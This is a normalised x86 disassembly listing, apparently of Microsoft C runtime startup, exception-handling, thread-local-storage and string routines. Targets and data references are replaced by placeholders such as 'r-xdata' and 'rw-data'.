mov [ ebp - 0x4 ] eax
pop esi
test eax eax
je r-xdata
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call [ RaiseException@IAT ]
leave
retn 0x8
test [ eax ] 0x8
je r-xdata
mov [ ebp - 0xc ] 0x1994000
sub_406ce6
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_406cd6
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_406807
pop ecx
sub_406d07
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add ecx 0x9
push ecx
add eax 0x9
push eax
call sub_40b000
neg eax
pop ecx
sbb eax eax
pop ecx
inc eax
pop ebp
retn 0x4
sub_406d27
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov ebp [ ebp - 0x4 ]
mov esp [ ebx - 0x4 ]
jmp eax
sub_406d60
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov esi [ fs : 0x0 ]
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x8 ] r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call RtlUnwind
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
and eax 0xfffffffd
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov edi [ fs : 0x0 ]
mov ebx [ ebp - 0x4 ]
mov [ ebx ] edi
mov [ fs : 0x0 ] ebx
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_406db4
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
cld
mov [ ebp - 0x4 ] eax
xor eax eax
push eax
push eax
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40895b
add esp 0x20
mov [ ebp - 0x8 ] eax
pop edi
pop esi
pop ebx
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_406dea
mov edi edi
push ebp
mov ebp esp
push esi
cld
mov esi [ ebp + 0xc ]
mov ecx [ esi + 0x8 ]
xor ecx esi
call sub_407abb
push 0x0
push esi
push [ esi + 0x14 ]
push [ esi + 0xc ]
push 0x0
push [ ebp + 0x10 ]
push [ esi + 0x10 ]
push [ ebp + 0x8 ]
call sub_40895b
add esp 0x20
pop esi
pop ebp
retn
sub_406e1d
mov edi edi
push ebp
mov ebp esp
sub esp 0x38
push ebx
cmp [ ebp + 0x8 ] 0x123
jne r-xdata
and [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] sub_406ef4
mov eax [ rw-data ]
lea ecx [ ebp - 0x28 ]
xor eax ecx
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x10 ] eax
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] esp
mov [ ebp - 0x8 ] ebp
mov eax [ fs : 0x0 ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x38 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x34 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x30 ] eax
call sub_4072c1
mov eax [ eax + 0x80 ]
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x34 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax ]
call [ ebp - 0x2c ]
pop ecx
pop ecx
and [ ebp - 0x38 ] 0x0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax r-xdata
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov ebx [ ebp - 0x28 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
jmp r-xdata
pop ebx
leave
retn
mov eax [ ebp - 0x38 ]
sub_406ef4
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
cld
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x8 ]
xor ecx [ ebp + 0xc ]
call sub_407abb
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0x66
je r-xdata
push 0x1
mov eax [ ebp + 0xc ]
push [ eax + 0x18 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x14 ]
mov eax [ ebp + 0xc ]
push [ eax + 0xc ]
push 0x0
push [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x10 ]
push [ ebp + 0x8 ]
call sub_40895b
add esp 0x20
mov eax [ ebp + 0xc ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
xor eax eax
inc eax
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x123
call sub_406e1d
add esp 0x1c
mov eax [ ebp - 0x4 ]
mov ebx [ ebp + 0xc ]
mov esp [ ebx + 0x1c ]
mov ebp [ ebx + 0x20 ]
jmp eax
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_406d60
pop ebx
leave
retn
sub_406f93
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x10 ]
mov esi [ edi + 0xc ]
mov [ ebp - 0x4 ] eax
mov ebx esi
jmp r-xdata
mov [ ebp + 0x8 ] esi
cmp esi 0xffffffff
jne r-xdata
mov eax [ ebp + 0x14 ]
inc esi
mov [ eax ] esi
mov eax [ ebp + 0x18 ]
mov [ eax ] ebx
cmp ebx [ edi + 0xc ]
ja r-xdata
mov ecx [ ebp + 0x10 ]
dec esi
mov eax esi
imul eax eax 0x14
add eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] ecx
jge r-xdata
call sub_40b0d4
call sub_40b0d4
cmp esi ebx
jbe r-xdata
cmp esi 0xffffffff
jne r-xdata
cmp ecx [ eax + 0x8 ]
jle r-xdata
mov eax esi
imul eax eax 0x14
add eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0xc ] 0x0
jge r-xdata
dec [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
sub_407006
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] eax
call sub_4072c1
mov eax [ eax + 0x98 ]
mov [ esi + 0x4 ] eax
call sub_4072c1
mov [ eax + 0x98 ] esi
mov eax esi
pop esi
pop ebp
retn
sub_407032
mov edi edi
push ebp
mov ebp esp
call sub_4072c1
mov eax [ eax + 0x98 ]
jmp r-xdata
test eax eax
jne r-xdata
mov ecx [ eax ]
cmp ecx [ ebp + 0x8 ]
je r-xdata
inc eax
pop ebp
retn
xor eax eax
pop ebp
retn
mov eax [ eax + 0x4 ]
sub_407059
mov edi edi
push ebp
mov ebp esp
push esi
call sub_4072c1
mov esi [ ebp + 0x8 ]
cmp esi [ eax + 0x98 ]
jne r-xdata
call sub_4072c1
mov eax [ eax + 0x98 ]
jmp r-xdata
call sub_4072c1
mov ecx [ esi + 0x4 ]
mov [ eax + 0x98 ] ecx
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov ecx [ eax + 0x4 ]
cmp esi ecx
je r-xdata
pop esi
pop ebp
jmp sub_40b0d4
mov ecx [ esi + 0x4 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov eax ecx
pop esi
pop ebp
retn
sub_4070ab
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
and [ ebp - 0x18 ] 0x0
lea ecx [ ebp - 0x18 ]
xor eax ecx
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x14 ]
inc eax
mov [ ebp - 0x14 ] sub_406dea
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov eax [ fs : 0x0 ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
push [ ebp + 0x18 ]
push ecx
push [ ebp + 0x10 ]
call sub_40b120
mov ecx eax
mov eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
mov eax ecx
leave
retn
sub_407123
mov edi edi
push esi
push [ rw-data ]
call [ TlsGetValue@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
retn
push [ rw-data ]
call [ DecodePointer@IAT ]
mov esi eax
push esi
push [ rw-data ]
call [ TlsSetValue@IAT ]
sub_407157
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push eax
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
or [ rw-data ] 0xffffffff
jmp sub_40b1b6
push eax
call [ TlsFree@IAT ]
or [ rw-data ] 0xffffffff
sub_407194
push 0x8
push r--data
call sub_40be80
push r--data
call [ GetModuleHandleW@IAT ]
mov esi [ ebp + 0x8 ]
mov [ esi + 0x5c ] r--data
and [ esi + 0x8 ] 0x0
xor edi edi
inc edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x70 ] edi
mov [ esi + 0xc8 ] 0x43
mov [ esi + 0x14b ] 0x43
mov [ esi + 0x68 ] rw-data
push 0xd
call sub_40b2e6
pop ecx
and [ ebp - 0x4 ] 0x0
push [ esi + 0x68 ]
call [ InterlockedIncrement@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_407236
push 0xc
call sub_40b2e6
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0xc ]
mov [ esi + 0x6c ] eax
test eax eax
jne r-xdata
push [ esi + 0x6c ]
call sub_40b319
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40723f
call sub_40bec5
retn
mov eax [ rw-data ]
mov [ esi + 0x6c ] eax
sub_407248
mov edi edi
push esi
push edi
call [ GetLastError@IAT ]
push [ rw-data ]
mov edi eax
call sub_407123
call eax
mov esi eax
test esi esi
jne r-xdata
push edi
call [ SetLastError@IAT ]
pop edi
mov eax esi
pop esi
retn
push 0x214
push 0x1
call sub_409f5e
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
test eax eax
je r-xdata
push esi
call sub_408a41
pop ecx
xor esi esi
push 0x0
push esi
call sub_407194
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
sub_4072db
push 0x8
push r--data
call sub_40be80
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_40bec5
retn 0x4
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
push eax
call sub_408a41
pop ecx
mov eax [ esi + 0x34 ]
test eax eax
je r-xdata
push eax
call sub_408a41
pop ecx
mov eax [ esi + 0x3c ]
test eax eax
je r-xdata
push eax
call sub_408a41
pop ecx
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
push eax
call sub_408a41
pop ecx
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
push eax
call sub_408a41
pop ecx
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
push eax
call sub_408a41
pop ecx
mov eax [ esi + 0x5c ]
cmp eax r--data
je r-xdata
push eax
call sub_408a41
pop ecx
push 0xd
call sub_40b2e6
pop ecx
and [ ebp - 0x4 ] 0x0
mov edi [ esi + 0x68 ]
test edi edi
je r-xdata
push eax
call sub_408a41
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4073f5
push 0xc
call sub_40b2e6
pop ecx
mov [ ebp - 0x4 ] 0x1
mov edi [ esi + 0x6c ]
test edi edi
je r-xdata
push edi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_407401
push esi
call sub_408a41
pop ecx
push edi
call sub_40b3a8
pop ecx
cmp edi [ rw-data ]
je r-xdata
cmp edi rw-data
je r-xdata
cmp edi rw-data
je r-xdata
push edi
call sub_408a41
pop ecx
cmp [ edi ] 0x0
jne r-xdata
push edi
call sub_40b441
pop ecx
sub_40740a
mov edi edi
push edi
push r--data
call [ GetModuleHandleW@IAT ]
mov edi eax
test edi edi
jne r-xdata
push esi
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
cmp [ rw-data ] 0x0
mov esi [ TlsSetValue@IAT ]
mov [ rw-data ] eax
je r-xdata
call sub_407157
xor eax eax
pop edi
retn
mov eax [ TlsGetValue@IAT ]
mov [ rw-data ] eax
mov eax [ TlsFree@IAT ]
mov [ rw-data ] sub_407114
mov [ rw-data ] esi
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push [ rw-data ]
push eax
call esi
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_4075da
push [ rw-data ]
mov esi [ EncodePointer@IAT ]
call esi
push [ rw-data ]
mov [ rw-data ] eax
call esi
push [ rw-data ]
mov [ rw-data ] eax
call esi
push [ rw-data ]
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
call sub_40b16c
test eax eax
je r-xdata
test eax eax
jne r-xdata
call sub_407157
mov edi [ DecodePointer@IAT ]
push sub_4072db
push [ rw-data ]
call edi
call eax
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
call [ TlsAlloc@IAT ]
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
push 0x214
push 0x1
call sub_409f5e
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call edi
call eax
test eax eax
je r-xdata
push 0x0
push esi
call sub_407194
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
xor eax eax
inc eax
jmp r-xdata
pop esi
pop edi
retn
sub_407585
mov edi edi
push ebp
mov ebp esp
push r--data
call [ GetModuleHandleW@IAT ]
test eax eax
je r-xdata
pop ebp
retn
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call eax
sub_4075da
mov edi edi
push esi
call sub_40710b
mov esi eax
push esi
call sub_40af50
push esi
call sub_40c43e
push esi
call sub_40c42f
push esi
call sub_40c274
push esi
call sub_40c06f
push esi
call sub_40b10c
add esp 0x18
pop esi
retn
sub_40760d
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
jmp r-xdata
cmp esi [ ebp + 0xc ]
jb r-xdata
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov ecx [ esi ]
test ecx ecx
je r-xdata
add esi 0x4
call ecx
sub_407631
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_40c6af
push r--data
push r--data
call sub_40760d
pop ecx
pop ecx
test eax eax
jne r-xdata
push rw-data
call sub_40c770
pop ecx
test eax eax
je r-xdata
pop ebp
retn
push esi
push edi
push sub_40c689
call sub_407d41
mov eax r--data
mov esi r--data
pop ecx
mov edi eax
cmp eax esi
jae r-xdata
push [ ebp + 0x8 ]
call [ rw-data ]
pop ecx
cmp [ rw-data ] 0x0
pop edi
pop esi
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
xor eax eax
push rw-data
call sub_40c770
pop ecx
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
push 0x0
push 0x2
push 0x0
call [ rw-data ]
sub_4076c8
push 0x20
push r--data
call sub_40be80
push 0x8
call sub_40b2e6
pop ecx
and [ ebp - 0x4 ] 0x0
xor eax eax
inc eax
cmp [ rw-data ] eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4077f3
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ rw-data ] eax
mov al [ ebp + 0x10 ]
mov [ rw-data ] al
cmp [ ebp + 0xc ] 0x0
jne r-xdata
call sub_40bec5
retn
mov [ rw-data ] 0x1
push 0x8
call sub_40b20d
pop ecx
push [ ebp + 0x8 ]
call sub_4075b0
mov [ ebp - 0x20 ] r--data
push [ rw-data ]
mov esi [ DecodePointer@IAT ]
call esi
mov ebx eax
mov [ ebp - 0x30 ] ebx
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax ]
test eax eax
je r-xdata
mov [ ebp - 0x1c ] r--data
push [ rw-data ]
call esi
mov edi eax
mov [ ebp - 0x2c ] edi
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] edi
add [ ebp - 0x20 ] 0x4
jmp r-xdata
call eax
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
test eax eax
je r-xdata
call sub_40710b
cmp [ edi ] eax
je r-xdata
cmp [ ebp - 0x20 ] r--data
jae r-xdata
add [ ebp - 0x1c ] 0x4
jmp r-xdata
call eax
sub edi 0x4
mov [ ebp - 0x2c ] edi
cmp edi ebx
jb r-xdata
cmp edi ebx
jb r-xdata
cmp [ ebp - 0x1c ] r--data
jae r-xdata
push [ edi ]
call esi
mov ebx eax
call sub_40710b
mov [ edi ] eax
call ebx
push [ rw-data ]
call esi
mov ebx eax
push [ rw-data ]
call esi
cmp [ ebp - 0x24 ] ebx
jne r-xdata
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x28 ] eax
mov edi eax
mov [ ebp - 0x2c ] edi
cmp [ ebp - 0x28 ] eax
je r-xdata
mov ebx [ ebp - 0x30 ]
jmp r-xdata
sub_407899
push 0x14
push r--data
call sub_40be80
xor esi esi
cmp [ rw-data ] esi
jne r-xdata
mov eax 0x5a4d
cmp [ __dos_header ] ax
je r-xdata
push esi
push esi
push 0x1
push esi
call [ HeapSetInformation@IAT ]
mov eax [ r--data ]
cmp [ eax + __dos_header ] 0x4550
jne r-xdata
mov [ ebp - 0x1c ] esi
jmp r-xdata
mov ecx 0x10b
cmp [ eax + r--data ] cx
jne r-xdata
call sub_40d097
test eax eax
jne r-xdata
cmp [ eax + r--data ] 0xe
jbe r-xdata
call sub_40740a
test eax eax
jne r-xdata
push 0x1c
call sub_407870
xor ecx ecx
cmp [ eax + __coff_header ] esi
setne cl
mov [ ebp - 0x1c ] ecx
call sub_40c663
mov [ ebp - 0x4 ] esi
call sub_40ce52
test eax eax
jns r-xdata
push 0x10
call sub_407870
call [ GetCommandLineA@IAT ]
mov [ rw-data ] eax
call sub_40cdbb
mov [ rw-data ] eax
call sub_40cd00
test eax eax
jns r-xdata
push 0x1b
call sub_407852
call sub_40ca8a
test eax eax
jns r-xdata
push 0x8
call sub_407852
push 0x1
call sub_407631
pop ecx
cmp eax esi
je r-xdata
push 0x9
call sub_407852
mov eax [ rw-data ]
mov [ rw-data ] eax
push eax
push [ rw-data ]
push [ rw-data ]
call sub_404100
add esp 0xc
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x1c ] esi
jne r-xdata
push eax
call sub_407852
call sub_407834
jmp r-xdata
push eax
call sub_407808
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x20 ]
call sub_40bec5
retn
sub_407a30
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
add ecx 0x1
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea esp [ esp ]
lea esp [ esp ]
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_407aca
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_407afd
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
mov [ ebp - 0x10 ] esp
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_407b33
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
mov [ ebp - 0x10 ] eax
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_407b8c
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
js r-xdata
call sub_40d256
mov esi [ eax ]
call sub_40d256
cmp esi [ eax ]
jl r-xdata
call sub_40d25c
mov eax [ eax + esi * 4 ]
pop esi
pop ebp
retn
sub_407bb4
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
call sub_407248
mov esi eax
xor ebx ebx
cmp esi ebx
jne r-xdata
push edi
mov edi 0x86
cmp [ esi + 0x24 ] ebx
jne r-xdata
mov eax r--data
jmp r-xdata
push [ ebp + 0x8 ]
mov esi [ esi + 0x24 ]
call sub_407b8c
push eax
push edi
push esi
call sub_40ae37
add esp 0x10
test eax eax
jne r-xdata
push 0x1
push edi
call sub_409f5e
pop ecx
pop ecx
mov [ esi + 0x24 ] eax
cmp eax ebx
jne r-xdata
pop esi
pop ebx
pop ebp
retn
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_40c576
int3
mov eax esi
jmp r-xdata
mov eax r--data
pop edi
sub_407c1e
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ DecodePointer@IAT ]
push edi
push [ rw-data ]
call esi
push [ rw-data ]
mov ebx eax
mov [ ebp - 0x4 ] ebx
call esi
mov esi eax
cmp esi ebx
jb r-xdata
xor eax eax
mov edi esi
sub edi ebx
lea eax [ edi + 0x4 ]
cmp eax 0x4
jb r-xdata
push ebx
call sub_40d317
mov ebx eax
lea eax [ edi + 0x4 ]
pop ecx
cmp ebx eax
jae r-xdata
push [ ebp + 0x8 ]
mov edi [ EncodePointer@IAT ]
call edi
mov [ esi ] eax
add esi 0x4
push esi
call edi
mov [ rw-data ] eax
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov eax 0x800
cmp ebx eax
jae r-xdata
pop edi
pop esi
pop ebx
leave
retn
add eax ebx
cmp eax ebx
jb r-xdata
mov eax ebx
lea eax [ ebx + 0x10 ]
cmp eax ebx
jb r-xdata
push eax
push [ ebp - 0x4 ]
call sub_409faa
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
push [ ebp - 0x4 ]
call sub_409faa
pop ecx
pop ecx
test eax eax
je r-xdata
sar edi 0x2
push eax
lea esi [ eax + edi * 4 ]
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
sub_407cd4
mov edi edi
push esi
push 0x4
push 0x20
call sub_409f5e
pop ecx
pop ecx
mov esi eax
push esi
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
mov [ rw-data ] eax
test esi esi
jne r-xdata
and [ esi ] 0x0
xor eax eax
pop esi
retn
push 0x18
pop eax
pop esi
retn
sub_407d05
push 0xc
push r--data
call sub_40be80
call sub_4075c8
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_407c1e
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_407d3b
mov eax [ ebp - 0x1c ]
call sub_40bec5
retn
sub_407d63
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_406775
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_406807
pop ecx
sub_407d8a
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
xor eax eax
inc eax
lea edx [ eax + 0x8 ]
cmp [ edx ] 0x0
je r-xdata
mov esi [ ebp + 0xc ]
mov ecx [ esi + 0x4 ]
cmp eax ecx
je r-xdata
test [ esi ] 0x2
je r-xdata
add ecx 0x8
push ecx
push edx
call sub_40b000
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x10 ]
mov eax [ eax ]
test al 0x1
je r-xdata
test [ edi ] 0x8
je r-xdata
xor eax eax
jmp r-xdata
test al 0x2
je r-xdata
test [ edi ] 0x1
je r-xdata
pop edi
pop esi
pop ebp
retn
test [ edi ] 0x2
je r-xdata
sub_407de9
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xe0434352
je r-xdata
call sub_4072c1
cmp [ eax + 0x90 ] 0x0
jle r-xdata
cmp eax 0xe0434f4d
je r-xdata
xor eax eax
pop ebp
retn
call sub_4072c1
dec [ eax + 0x90 ]
cmp eax 0xe06d7363
jne r-xdata
call sub_4072c1
and [ eax + 0x90 ] 0x0
jmp sub_40b088
sub_407e38
push 0x10
push r--data
call sub_40be80
mov edi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
cmp [ edi + 0x4 ] 0x80
jg r-xdata
mov esi [ ebx + 0x8 ]
movsx esi [ ebx + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_407efa
cmp esi [ ebp + 0x14 ]
je r-xdata
cmp esi 0xffffffff
jle r-xdata
mov [ ebp - 0x1c ] esi
call sub_4072c1
inc [ eax + 0x90 ]
and [ ebp - 0x4 ] 0x0
mov [ ebx + 0x8 ] esi
call sub_40bec5
retn
call sub_40b0d4
call sub_40b0d4
cmp esi [ edi + 0x4 ]
jl r-xdata
mov eax esi
mov ecx [ edi + 0x8 ]
mov esi [ ecx + eax * 8 ]
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x4 ] 0x1
cmp [ ecx + eax * 8 + 0x4 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov [ ebx + 0x8 ] esi
push 0x103
push ebx
mov ecx [ edi + 0x8 ]
push [ ecx + eax * 8 + 0x4 ]
call sub_40b120
mov [ ebp - 0x1c ] esi
jmp r-xdata
cmp esi [ ebp + 0x14 ]
je r-xdata
sub_407f14
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov ecx [ eax + 0x14 ]
cmp ecx 0x19930520
je r-xdata
cmp [ eax + 0x1c ] 0x0
jne r-xdata
cmp ecx 0x19930521
je r-xdata
call sub_4072c1
xor ecx ecx
inc ecx
mov [ eax + 0x20c ] ecx
mov eax ecx
retn
cmp ecx 0x19930522
jne r-xdata
sub_407f59
push 0x8
push r--data
call sub_40be80
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
call sub_40bec5
retn
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ecx + 0x1c ]
test eax eax
je r-xdata
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
and [ ebp - 0x4 ] 0x0
push eax
push [ ecx + 0x18 ]
call sub_406d59
mov [ ebp - 0x4 ] 0xfffffffe
sub_407fae
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov eax [ ecx ]
push esi
mov esi [ ebp + 0x8 ]
add eax esi
cmp [ ecx + 0x4 ] 0x0
jl r-xdata
pop esi
pop ebp
retn
mov edx [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov esi [ edx + esi ]
mov ecx [ esi + ecx ]
add ecx edx
add eax ecx
sub_407fe8
mov edi edi
push ebp
mov ebp esp
xor eax eax
sub esp 0xc
cmp edi eax
jne r-xdata
mov [ ebp - 0x1 ] al
mov [ ebp - 0xc ] eax
cmp [ edi ] eax
jle r-xdata
call sub_40b0d4
